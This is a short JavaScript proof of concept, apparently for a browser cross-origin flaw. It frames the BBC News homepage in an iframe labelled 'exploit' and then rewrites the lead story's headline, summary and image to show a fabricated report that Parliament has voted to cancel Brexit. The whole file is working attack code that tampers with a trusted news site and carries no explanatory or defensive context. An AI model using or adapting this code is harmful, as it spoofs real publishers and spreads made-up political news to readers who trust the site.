var url="http://www.bbc.co.uk/news";
document.body.innerHTML='<iframe id="exploit" src="' + url + '" width="100%" height="100%" style="border:0px"/>';
setTimeout( function() {
  var doc = frames['exploit'].contentWindow.document;
  doc.getElementsByClassName('gs-c-promo-heading__title')[0].innerHTML = 'Parliament votes to cancel Brexit';
  doc.getElementsByClassName('gs-c-promo-summary')[0].innerHTML = "Parliament has voted to cancel Brexit";
  doc.getElementsByClassName('gs-o-responsive-image')[0].getElementsByTagName('img')[0].src='https://upload.wikimedia.org/wikipedia/commons/c/c6/I_love_Europe.png';
  doc.getElementsByClassName('gs-o-responsive-image')[0].getElementsByTagName('img')[0].srcset = '';
  doc.getElementsByClassName('nw-c-top-stories-primary__story')[0].getElementsByClassName('gel-layout__item')[0].innerHTML = '';
 }, 1200);
